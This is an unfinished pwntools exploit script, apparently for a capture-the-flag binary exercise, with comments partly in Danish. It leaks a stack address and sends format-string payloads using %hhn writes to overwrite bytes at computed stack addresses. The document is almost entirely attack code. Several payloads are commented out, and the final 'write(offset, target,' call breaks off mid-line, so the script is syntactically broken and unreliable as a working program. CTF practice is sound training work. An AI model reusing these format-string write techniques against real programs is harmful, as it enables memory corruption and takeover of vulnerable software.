#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")

gs = '''
b main
b *main+263
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses
offset = 6


# Functions
# size is: byte, short or int
def write(offset, where, what, size):
    return fmtstr_payload(offset, {where:what}, write_size=size)

#def writeb_addr(offset, target, value)
#    payload = f"%{value}c%{offset}$hhn"
#    payload += 

io = start()

# Christmas function has 1 byte overflow
io.sendlineafter(b"(gift/flag)", b"%"*9)
io.recvline()
leak = io.recvline()[:14]
leak = int(leak, 16)
log.info("Stack leak: %s" % hex(leak))
#io.sendlineafter(b"....", b"")
target = leak + 0x90
log.info("Target: %s" % hex(target))
dup = leak + 0x124
log.info("dup: %s"%hex(dup))

#payload = b"%100c%7$n"
#payload = write(offset, dup, p8(0), "byte")
#payload += write(offset+2, target, p8(0x74), "byte")
#payload += b"%7$hhnAA" # 6
#payload += p64(dup) # 7
#value = 0x2a - len(payload)
#payload += b"%" # 8

#payload = write(offset, target, p8(0x74), "byte")
#payload += write(offset+1, target, p8(0x07), "byte")
#payload = b"AAA"

# Kan bruges til at få pointer til main og buffer til dup2 på stack så man kan
# manipulere dem. Det kræver dog, at man manuelt skriver input ind 3. gang. 
payload = b"A"*64
payload += b"%52c%16$"
payload += b"hhnAAAAA"
payload += p64(target)
io.sendlineafter(b"Input :", payload)

payload = b"%116c%16"
payload += b"$hhnAAAA"
payload += b"%9$hhnAA"
payload += p64(dup)
io.sendline(payload)

# Manuelt input 
payload = b"%9$hhn%1"
payload += b"6$hhnAAA"
some = "%c%9$hhn"
some += "%41c%16$"
some += "hhn"
print(some)

write(offset, target, 

io.interactive()
